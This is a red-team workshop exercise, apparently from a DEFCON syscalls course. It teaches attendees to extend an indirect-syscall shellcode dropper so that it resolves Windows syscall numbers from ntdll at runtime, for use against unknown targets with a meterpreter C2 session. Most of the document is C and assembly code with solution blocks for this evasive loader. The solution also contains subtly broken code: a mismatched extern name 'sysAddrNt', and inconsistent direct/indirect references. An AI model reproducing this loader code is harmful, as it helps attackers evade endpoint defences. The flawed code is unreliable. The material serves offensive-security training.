## LAB Exercise 6: Dynamic Retrieval from SSNs

In the first bonus chapter we want to further develop our indirect syscall dropper. Until now, we had the limitation that our dropper would only work in the context of the Windows version that was used to debug the system service numbers (SSNs) for the used native functions ``NtAllocateVirtualMemory``, ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``. Why? Because to get the basics for direct and indirect syscalls, we have implemented the SSNs as hardcoded values in our assembly resource file. But normally, when we are preparing for a red team engagement, we do not know the Windows version of our target client. So we want to make our indirect syscall dropper a bit more flexible and instead of hardcoding the SSNs, we want to retrieve them dynamically at runtime from ntdll.dll. 

### Prerequisite 
- Chapter 7 has been completed and you already have a working indirect syscall poc that currently uses hardcoded SSNs.
  

## Exercise 6 Tasks: 
### Develop your indirect syscall dropper to dynamically retrieve SSNs.
| Task Nr.   | Task Description |
| :---:      | ---              |
|  1         | To implement the dynamic SSN retrieval functionality, you will need to complete the following tasks: <ul><li>Complete the missing code in the ``main`` code section</li><li>Complete the missing code in the ``syscalls.asm`` file</li></ul>                  |

### Analyse the Dropper
| Task Nr.   | Task Description |
| :---:      | ---              |
| 2          | Use **x64dbg** to debug or analyse the dropper. <ul><li>What differences can you see between a dropper with hardcoded SSNs and a dropper that dynamically retrieves SSNs at runtime?</li></ul>                |

## Visual Studio
As mentioned, you will need an already working indirect syscall dropper poc by the end of chapter 7. Based on this, we want to improve our indirect syscall dropper to retrieve the SSNs dynamically at runtime, rather than hardcoding them.  
  
### Start Address Native Function
In order to be able to dynamically retrieve the SSN for each of the native functions used in our code, we first need to define a pointer to a function that holds the start address of that function. If you remember, this part of the code was already implemented in the chapter where we built the indirect syscall dropper, because we used the same principle to get the address for the syscall instruction of each function. This means that part of the code in the main file is already implemented.  
<details>
<summary>Code</summary>
    
```C
// Declare and initialize a pointer to the NtAllocateVirtualMemory function and get the address of the NtAllocateVirtualMemory function in the ntdll.dll module
    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");     
```
     
</details>

### Memory Address System Service Number (SSN)
In the next step, we want to get the effective memory address from the ``SSN`` in the ``syscall stub`` of the native function by adding the necessary offset to the start address of the native function that we retrieved in the previous step. To get the memory address from the syscall instruction, we need to add ``4-bytes``. Why 4-bytes? Because this is the offset calculated from the start address of the native function.

<details>
    <p align="center">
<img width="1000" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/1b6bd7f1-1323-48d1-bcb2-83d4395c49bb"> 
    </p>
</details>   


In the indirect syscall poc in this chapter, this code is implemented only for the native function ``NtAllocateVirtualMemory`` and must be completed by the workshop attendee based on the code scheme for ``NtAllocateVirtualMemory`` which can be seen in the code section below.  
<details>
<summary>Code</summary>
    
```C
// Here we're retrieving the system call number for each function. The syscall number is used to identify the syscall when the program uses the syscall instruction.
    // It's assumed that the syscall number is located 4 bytes into the function.
    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];     
```
     
</details>   

If it was not possible for you to complete this code section, don`t worry it will work next time and additionally you can find the complete code in the following solution section. 

<details>
<summary>Solution</summary>
    
```C
// Here we're retrieving the system call number for each function. The syscall number is used to identify the syscall when the program uses the syscall instruction.
    // It's assumed that the syscall number is located 4 bytes into the function.
    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];
    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
    wNtCreateThreadEx = ((unsigned char*)(pNtCreateThreadEx + 4))[0];
    wNtWaitForSingleObject = ((unsigned char*)(pNtWaitForSingleObject + 4))[0];    
```
     
</details>

### Global Variables
To store the memory address from the SSN of the respective native function, and also to be able to provide the memory address later for the assembly code in the ``syscalls.asm`` file, we declare a global variable for each SSN address, which is declared as a DWORD. Also in this case in the indirect syscall poc of this chapter, this code is implemented only for the native function ``NtAllocateVirtualMemory`` and must be completed by the workshop attendee based on the code scheme for ``NtAllocateVirtualMemory`` which can be seen in the code section below.

<details>
<summary>Code</summary>
    
```C
// Global DWORD (double words) that will hold the SSN
DWORD wNtAllocateVirtualMemory;       
```
     
</details>   

If it was not possible for you to complete this code section, don`t worry it will work next time and additionally you can find the complete code in the following solution section. 

<details>
<summary>Solution</summary>
    
```C
// Declare global variables to hold the syscall instruction addresses
DWORD wNtAllocateVirtualMemory;
DWORD wNtWriteVirtualMemory;
DWORD wNtCreateThreadEx;
DWORD wNtWaitForSingleObject;     
```
     
</details>



### Assembly Instructions
Again, we don't want to ask ntdll for the syscall stub, but in this case we want to replace the hardcoded SSN with the variable that holds the SSN for the respective native function. Therefore, we need to complete the code in the ``syscalls.asm`` file. The code below shows the assembler code for the syscall stub of ``NtAllocateVirtualMemory`` which is already implemented in the syscalls.asm file in context of the indirect syscall dropper.  
  
<details>
<summary>Code</summary>

```asm
  EXTERN wNtAllocateVirtualMemory:DWORD               ; Holds the dynamic retrieved SSN for NtAllocateVirtualMemory 
  EXTERN sysAddrNtAllocateVirtualMemory:QWORD         ; Holds the actual address of the NtAllocateVirtualMemory syscall in ntdll.dll.
     
.CODE  ; Start the code section

; Procedure for the NtAllocateVirtualMemory syscall
NtAllocateVirtualMemory PROC
    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, wNtAllocateVirtualMemory               ; Move the syscall number into the eax register.
    jmp QWORD PTR [sysAddrNtAllocateVirtualMemory]  ; Jump to the actual syscall.
NtAllocateVirtualMemory ENDP                     	; End of the procedure.     
     
END  ; End of the module     
     
```
 
</details>
  
It is **your task** to **add** the ``syscalls.asm`` file as a resource (existing item) to the indirect syscall dropper project and **complete the assembler code and C code** for the other three missing native APIs ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``.

If you are unable to complete the assembly code at this time, you can use the assembly code from the solution and paste it into the ``syscalls.asm`` file in the **direct syscall dropper poc**. 
    
<details>
    <summary>Solution</summary>

```asm
  
EXTERN wNtAllocateVirtualMemory:DWORD               ; Holds the dynamic retrieved SSN for NtAllocateVirtualMemory
EXTERN wNtWriteVirtualMemory:DWORD                  ; Holds the dynamic retrieved SSN for NtWriteVirtualMemory
EXTERN wNtCreateThreadEx:DWORD                      ; Holds the dynamic retrieved SSN for NtCreateThreadEx
EXTERN wNtWaitForSingleObject:DWORD                 ; Holds the dynamic retrieved SSN for NtWaitForSingleObject

EXTERN sysAddrNtAllocateVirtualMemory:QWORD         ; The actual address of the NtAllocateVirtualMemory syscall in ntdll.dll.
EXTERN sysAddrNt:QWORD                              ; The actual address of the NtWriteVirtualMemory syscall in ntdll.dll.
EXTERN sysAddrNtCreateThreadEx:QWORD                ; The actual address of the NtCreateThreadEx syscall in ntdll.dll.
EXTERN sysAddrNtWaitForSingleObject:QWORD           ; The actual address of the NtWaitForSingleObject syscall in ntdll.dll.


.CODE  ; Start the code section

; Procedure for the NtAllocateVirtualMemory syscall
NtAllocateVirtualMemory PROC
    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, wNtAllocateVirtualMemory               ; Move the syscall number into the eax register.
    jmp QWORD PTR [sysAddrNtAllocateVirtualMemory]  ; Jump to the actual syscall.
NtAllocateVirtualMemory ENDP                     	  ; End of the procedure.


; Similar procedures for NtWriteVirtualMemory syscalls
NtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, wNtWriteVirtualMemory
    jmp QWORD PTR [sysAddrNtWriteVirtualMemory]
NtWriteVirtualMemory ENDP


; Similar procedures for NtCreateThreadEx syscalls
NtCreateThreadEx PROC
    mov r10, rcx
    mov eax, wNtCreateThreadEx
    jmp QWORD PTR [sysAddrNtCreateThreadEx]
NtCreateThreadEx ENDP


; Similar procedures for NtWaitForSingleObject syscalls
NtWaitForSingleObject PROC
    mov r10, rcx
    mov eax, wNtWaitForSingleObject
    jmp QWORD PTR [sysAddrNtWaitForSingleObject]
NtWaitForSingleObject ENDP

END  ; End of the module
```
    
</details>


  

## Dropper Analysis: x64dbg 
The first step is to run your direct syscall dropper, check that the .exe is running and that a stable meterpreter C2 channel is open. 
Then we open x64dbg and attach to the running process, note that if you open the indirect syscall dropper directly in x64dbg, you need to run the assembly first.
     
<details>
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/a8509e63-ddea-4dee-894f-b2266bb3e504">
</p>
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/3547125b-a8c2-4e17-b7ec-84434181cf36">
</p>    
</details>
  
Then we want to analyse the dropper and compare our findings with the dropper which uses hardcoded SSNs
  
  
  ## Summary:
- Made the transition from hardcoded SSNs to dynamically retrieved SSNs.
- Dynamically retrieved SSNs are stored in globally declared variables. 
- Dynamically retrieved SSNs give us more flexibility in terms of targeting different versions of Windows.
